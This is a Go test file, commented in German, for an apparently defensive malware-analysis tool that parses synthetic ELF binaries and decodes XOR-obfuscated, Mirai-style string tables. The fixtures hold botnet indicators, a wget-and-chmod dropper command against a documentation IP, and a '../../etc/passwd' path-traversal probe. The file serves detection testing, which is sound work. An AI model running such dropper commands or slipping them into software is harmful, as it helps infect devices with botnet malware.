package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Synthetische ELF-Dateien für die Tests: selbst gebaute minimale Header, keine echte
// Schadsoftware. Die "Mirai"-Zeichenketten sind Klartext aus dem Test, mit XOR verschleiert.
type testELFSpec struct {
	class64    bool
	bigEndian  bool
	machine    uint16
	xorKey     byte
	xorStrs    []string // werden mit xorKey verschleiert, wie in Mirais Tabelle (Ende = verschlüsseltes Nullbyte)
	plain      []string // Klartext in .rodata
	noSections bool     // Section-Tabelle entfernt (wie bei UPX)
	badShoff   bool     // Section-Tabelle zeigt hinter das Dateiende (manipuliert)
	interp     string   // PT_INTERP (dynamisch gelinkt)
}

func buildTestELF(t *testing.T, s testELFSpec) []byte {
	t.Helper()
	var bo binary.ByteOrder = binary.LittleEndian
	if s.bigEndian {
		bo = binary.BigEndian
	}
	// Inhalt der Sections
	text := bytes.Repeat([]byte{0x00, 0x00, 0xa0, 0xe1}, 32) // irgendwelcher "Code"
	var ro bytes.Buffer
	ro.WriteString("\x00")
	for _, p := range s.plain {
		ro.WriteString(p + "\x00")
	}
	for _, x := range s.xorStrs {
		for i := 0; i < len(x); i++ {
			ro.WriteByte(x[i] ^ s.xorKey)
		}
		ro.WriteByte(s.xorKey) // verschlüsseltes Nullbyte
		ro.WriteByte(0)        // Nullbyte des Compilers
	}
	interp := []byte{}
	if s.interp != "" {
		interp = append([]byte(s.interp), 0)
	}
	shstr := []byte("\x00.text\x00.rodata\x00.shstrtab\x00.interp\x00")
	ehsz, phsz, shsz := 52, 32, 40
	if s.class64 {
		ehsz, phsz, shsz = 64, 56, 64
	}
	nph := 1
	if s.interp != "" {
		nph = 2
	}
	offText := ehsz + nph*phsz
	offRo := offText + len(text)
	offInterp := offRo + ro.Len()
	offShstr := offInterp + len(interp)
	offSh := offShstr + len(shstr)
	nsh := 4
	if s.interp != "" {
		nsh = 5
	}
	var b bytes.Buffer
	u16 := func(v int) { binary.Write(&b, bo, uint16(v)) }
	u32 := func(v int) { binary.Write(&b, bo, uint32(v)) }
	addr := func(v int) { // 32 oder 64 Bit
		if s.class64 {
			binary.Write(&b, bo, uint64(v))
		} else {
			binary.Write(&b, bo, uint32(v))
		}
	}
	cls, data := byte(1), byte(1)
	if s.class64 {
		cls = 2
	}
	if s.bigEndian {
		data = 2
	}
	b.Write([]byte{0x7f, 'E', 'L', 'F', cls, data, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0})
	u16(2) // ET_EXEC
	u16(int(s.machine))
	u32(1)
	addr(0x400000 + offText) // Einsprung
	addr(ehsz)               // phoff
	shoff, shnum := offSh, nsh
	if s.noSections {
		shoff, shnum = 0, 0
	}
	if s.badShoff {
		shoff = offSh + 1<<20
	}
	addr(shoff)
	u32(0)
	u16(ehsz)
	u16(phsz)
	u16(nph)
	u16(shsz)
	u16(shnum)
	u16(3) // .shstrtab
	phdr := func(typ, flags, off, filesz int) {
		if s.class64 {
			u32(typ)
			u32(flags)
			addr(off)
			addr(0x400000 + off)
			addr(0x400000 + off)
			addr(filesz)
			addr(filesz)
			addr(0x1000)
		} else {
			u32(typ)
			u32(off)
			u32(0x400000 + off)
			u32(0x400000 + off)
			u32(filesz)
			u32(filesz)
			u32(flags)
			u32(0x1000)
		}
	}
	if s.interp != "" {
		phdr(3, 4, offInterp, len(interp)) // PT_INTERP
	}
	phdr(1, 5, 0, offShstr) // PT_LOAD R-X
	b.Write(text)
	b.Write(ro.Bytes())
	b.Write(interp)
	b.Write(shstr)
	shdr := func(name, typ, flags, off, size int) {
		u32(name)
		u32(typ)
		addr(flags)
		addr(0x400000 + off)
		addr(off)
		addr(size)
		u32(0)
		u32(0)
		addr(1)
		addr(0)
	}
	if !s.noSections {
		b.Write(make([]byte, shsz))          // SHT_NULL
		shdr(1, 1, 6, offText, len(text))    // .text AX
		shdr(7, 1, 2, offRo, ro.Len())       // .rodata A
		shdr(15, 3, 0, offShstr, len(shstr)) // .shstrtab
		if s.interp != "" {
			shdr(25, 1, 2, offInterp, len(interp)) // .interp
		}
	}
	return b.Bytes()
}

var testMiraiTable = []string{"/proc/", "/exe", "/maps", "/dev/watchdog", "/dev/misc/watchdog", "enable", "system", "shell",
	"ncorrect", "assword", "ogin", "/bin/busybox ECCHI", "TSource Engine Query", "/etc/resolv.conf", "cnc.example-bot.test",
	"POST /cdn-cgi/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

func TestProgramELFArchitectures(t *testing.T) {
	for _, c := range []struct {
		name string
		spec testELFSpec
		arch string
		bits int
		end  string
	}{
		{"mips-be", testELFSpec{bigEndian: true, machine: 8, xorKey: 0x22, xorStrs: testMiraiTable}, "MIPS", 32, "Big-Endian"},
		{"mips-le", testELFSpec{machine: 8, xorKey: 0x37, xorStrs: testMiraiTable}, "MIPS", 32, "Little-Endian"},
		{"arm", testELFSpec{machine: 40, xorKey: 0x8f, xorStrs: testMiraiTable}, "ARM", 32, "Little-Endian"},
		{"arm-druckbar", testELFSpec{machine: 40, xorKey: 0x54, xorStrs: testMiraiTable}, "ARM", 32, "Little-Endian"},
		{"x86-64", testELFSpec{class64: true, machine: 62, xorKey: 0x22, xorStrs: testMiraiTable}, "x86-64", 64, "Little-Endian"},
	} {
		t.Run(c.name, func(t *testing.T) {
			b := buildTestELF(t, c.spec)
			pi := analyzeProgram(b)
			e := pi.ELF
			if e == nil || e.Arch != c.arch || e.Class != c.bits || e.Endian != c.end {
				t.Fatalf("Übersicht: %+v", e)
			}
			if !e.Static || !e.Stripped || e.Entry == "" || len(e.Segments) != 1 || len(e.Sections) < 3 || len(e.Notes) != 0 {
				t.Fatalf("Details: %+v", e)
			}
			if e.Segments[0].Flags != "R-X" {
				t.Errorf("Rechte: %+v", e.Segments)
			}
			x := pi.XOR
			if x == nil || x.Key != int(c.spec.xorKey) || x.Classic != (c.spec.xorKey == 0x22) {
				t.Fatalf("XOR: %+v", x)
			}
			got := map[string]bool{}
			for _, s := range x.Strings {
				got[s.Text] = true
			}
			for _, want := range []string{"/dev/watchdog", "TSource Engine Query", "cnc.example-bot.test", "/bin/busybox ECCHI", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"} {
				// Ist der Schlüssel selbst ein Buchstabe ("T"), ist ein führendes "T" nicht von
				// Füllbytes zu unterscheiden; es fehlt dann.
				if c.spec.xorKey == 'T' && want[0] == 'T' {
					want = want[1:]
				}
				if !got[want] {
					t.Errorf("nicht entschlüsselt: %q (%v)", want, x.Strings)
				}
			}
			// entschlüsselte Merkmale tauchen auch in den Gruppen auf
			if !groupHas(pi, "merkmale", "/dev/watchdog") || !groupHas(pi, "http", "POST /cdn-cgi/") {
				t.Errorf("Gruppen: %+v", pi.Groups)
			}
			if len(pi.Hex) == 0 || !strings.HasPrefix(pi.Hex[0], "00000000  7f 45 4c 46") {
				t.Errorf("Hex: %v", pi.Hex[:1])
			}
		})
	}
}

func groupHas(pi ProgramInfo, key, text string) bool {
	for _, g := range pi.Groups {
		if g.Key != key {
			continue
		}
		for _, it := range g.Items {
			if it.Text == text {
				return true
			}
		}
	}
	return false
}

// Ohne verschleierte Tabelle wird kein Schlüssel behauptet; Klartext wird eingeordnet.
func TestProgramPlainStrings(t *testing.T) {
	b := buildTestELF(t, testELFSpec{machine: 40, interp: "/lib/ld-linux.so.3", plain: []string{
		"wget http://198.51.100.7/bins/x.arm7 -O /tmp/x; chmod 777 /tmp/x", "/proc/net/tcp", "/var/run/evil.pid",
		"User-Agent: Wget", "xc3511", "dht.transmissionbt.com", "Hello world from the test",
	}})
	b = append(b, []byte("W\x00i\x00d\x00e\x00S\x00t\x00r\x00\x00\x00")...)
	pi := analyzeProgram(b)
	if pi.XOR != nil {
		t.Fatalf("Schlüssel behauptet: %+v", pi.XOR)
	}
	if pi.ELF.Static || pi.ELF.Interpreter != "/lib/ld-linux.so.3" {
		t.Errorf("dynamisch: %+v", pi.ELF)
	}
	for _, c := range [][2]string{{"adressen", "wget http://198.51.100.7/bins/x.arm7 -O /tmp/x; chmod 777 /tmp/x"}, {"merkmale", "/proc/net/tcp"},
		{"pfade", "/var/run/evil.pid"}, {"http", "User-Agent: Wget"}, {"merkmale", "xc3511"}, {"merkmale", "dht.transmissionbt.com"},
		{"rest", "Hello world from the test"}, {"rest", "WideStr"}} {
		if !groupHas(pi, c[0], c[1]) {
			t.Errorf("%s fehlt in %s: %+v", c[1], c[0], pi.Groups)
		}
	}
}

// Beschädigte oder entfernte Section-Tabellen, abgeschnittene Dateien: nie abstürzen.
func TestProgramBrokenHeaders(t *testing.T) {
	base := testELFSpec{bigEndian: true, machine: 8, xorKey: 0x22, xorStrs: testMiraiTable}
	noSec := base
	noSec.noSections = true
	pi := analyzeProgram(append(buildTestELF(t, noSec), []byte("UPX!")...))
	if pi.ELF == nil || pi.ELF.Arch != "MIPS" || pi.ELF.Packer != "UPX" || len(pi.ELF.Sections) != 0 || pi.XOR == nil {
		t.Fatalf("ohne Sections: %+v %+v", pi.ELF, pi.XOR)
	}
	bad := base
	bad.badShoff = true
	pi = analyzeProgram(buildTestELF(t, bad))
	if pi.ELF == nil || pi.ELF.Arch != "MIPS" || len(pi.ELF.Notes) == 0 || pi.XOR == nil {
		t.Fatalf("kaputte Section-Tabelle: %+v", pi.ELF)
	}
	full := buildTestELF(t, base)
	for n := 0; n <= len(full); n += 7 {
		analyzeProgram(full[:n]) // darf nicht abstürzen
	}
	// zufällige Bytes im Kopf
	for i := 16; i < 64; i++ {
		c := append([]byte{}, full...)
		c[i] ^= 0xff
		analyzeProgram(c)
	}
	if pi := analyzeProgram([]byte("\x7fELF\x01\x01")); pi.ELF != nil {
		t.Errorf("zu kurz: %+v", pi.ELF)
	}
}

// Zufällige Daten ergeben keinen Schlüssel.
func TestProgramNoFalseXOR(t *testing.T) {
	b := make([]byte, 256<<10)
	x := uint32(12345)
	for i := range b {
		x = x*1664525 + 1013904223
		b[i] = byte(x >> 24)
	}
	if pi := analyzeProgram(b); pi.XOR != nil || pi.ELF != nil {
		t.Fatalf("Zufall: %+v", pi.XOR)
	}
}

func TestProgramEndpointAndExplain(t *testing.T) {
	h := shareHive(t)
	b := buildTestELF(t, testELFSpec{bigEndian: true, machine: 8, xorKey: 0x22, xorStrs: testMiraiTable})
	sum := sha256.Sum256(b)
	sha := hex.EncodeToString(sum[:])
	dir := h.quarantineDir()
	os.MkdirAll(dir, 0o700)
	os.WriteFile(filepath.Join(dir, sha), b, 0o600)
	rec := httptest.NewRecorder()
	h.fundeProgram(rec, httptest.NewRequest("GET", "/api/funde/program?sha="+sha, nil))
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), `"key_hex":"0x22"`) {
		t.Fatalf("%d %s", rec.Code, clip(rec.Body.String(), 300))
	}
	// gespeichert: zweiter Aufruf liest aus dem Speicher
	if _, _, ok := h.st.lookupGet("prog:"+sha, "program", 0); !ok {
		t.Fatal("nicht gespeichert")
	}
	rec = httptest.NewRecorder()
	h.fundeProgram(rec, httptest.NewRequest("GET", "/api/funde/program?sha=../../etc/passwd", nil))
	if rec.Code != 400 {
		t.Errorf("Pfad: %d", rec.Code)
	}
	text, prompt, err := h.explainSource(context.Background(), "", "", sha)
	if err != nil || prompt != aiExplainProgramPrompt || !strings.Contains(text, "MIPS") || !strings.Contains(text, "TSource Engine Query") || strings.Contains(text, "\x7fELF") {
		t.Fatalf("Erklärtext: %v %q", err, clip(text, 400))
	}
	if len(text) > explainMaxText {
		t.Errorf("zu lang: %d", len(text))
	}
}

// Rechenzeit einer großen Datei (Pi: einmal je Datei, danach aus dem Speicher).
func BenchmarkAnalyzeProgram(b *testing.B) {
	data := make([]byte, 8<<20)
	x := uint32(7)
	for i := range data {
		x = x*1664525 + 1013904223
		data[i] = byte(x >> 24)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		analyzeProgram(data)
	}
}
